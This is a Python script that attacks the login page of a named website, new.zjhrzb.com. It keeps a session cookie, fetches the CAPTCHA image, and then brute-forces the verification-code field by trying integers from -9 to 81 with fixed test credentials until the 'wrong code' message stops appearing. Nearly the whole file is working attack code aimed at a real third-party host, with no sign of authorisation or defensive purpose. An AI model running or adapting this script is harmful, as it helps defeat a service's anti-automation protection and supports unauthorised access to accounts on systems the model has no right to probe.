import http.client
import http.cookiejar
import urllib.parse
import os

def login(opener, user, passwd, validcode):  
        params = urllib.parse.urlencode({'username' : user,
                                        'password' : passwd,
                                        'valicode' : validcode,
                                        'actionType' : 'login',
                                        'redirectURL' : '/member/index.html',
                                         'openId' : '',
                                         'openType' : ''})
        data = params.encode('utf-8')
        #conn = http.client.HTTPConnection("new.zjhrzb.com")
        #conn.request("GET", "http://new.zjhrzb.com/user/login.html", params, headers)
        #resp = conn.getresponse()
        #print(resp.status, resp.reason)
        request = urllib.request.Request("http://new.zjhrzb.com/user/login.html", data)
        resp = opener.open(request)
        resp_all = (resp.read().decode('utf-8'))
        ret = resp_all.find("验证码错误")
        #print(resp_all)
        if (-1 != ret):
            print("try valid code", validcode, 'failure')
        else:
            print("valid", validcode, 'bingo')
            
        return ret


cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
#let server rememer me
req = opener.open("http://new.zjhrzb.com/user/login.html?username=test&password=test12345678&valicode=-6&actionType=login&redirectURL=index.html&openId=&openType=")

print("validimg response")
request = urllib.request.Request("http://new.zjhrzb.com/validimg.html");
resp_img = opener.open(request)
with open("validimg.jpg", "wb") as f:
    f.write(resp_img.read())
print("cookie=", request.get_header("Cookie"))

#Brute force the valid code
for i in range(-9, 82):
    ret = login(opener, 'test', 'test12345678', i)
    if (ret == -1):
        print("login suceess")
        break
